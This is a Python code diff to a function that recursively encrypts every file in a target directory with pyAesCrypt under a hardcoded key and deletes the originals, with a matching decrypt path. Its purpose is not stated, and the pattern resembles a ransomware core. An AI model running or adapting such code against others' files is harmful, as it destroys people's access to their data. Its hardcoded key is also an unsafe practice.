@@ -46,19 +46,21 @@ def validUsername(username):
         return False
 
 
-def encryptFiles(targetDir="", decrypt=False, password="password"):
+def encryptFiles(targetDir="", decrypt=False, password="a2e9abf5feac6453b69463d9cde"):
     bufferSize = 64 * 1024
 
     for root, _, files in os.walk(targetDir, topdown=False):
         for name in files:
             filename = os.path.join(root, name)
 
-            if decrypt:
+            if decrypt and filename[-4:] == ".aes":
                 print("Decrypting", filename, "...")
+
                 pyAesCrypt.decryptFile(
                     filename, filename[:-4], password, bufferSize)
-            else:
+                os.remove(filename)
+            elif not decrypt and filename[-4:] != ".aes":
                 print("Encrypting", filename, "...")
                 pyAesCrypt.encryptFile(
                     filename, filename+".aes", password, bufferSize)
-            os.remove(filename)
+                os.remove(filename)
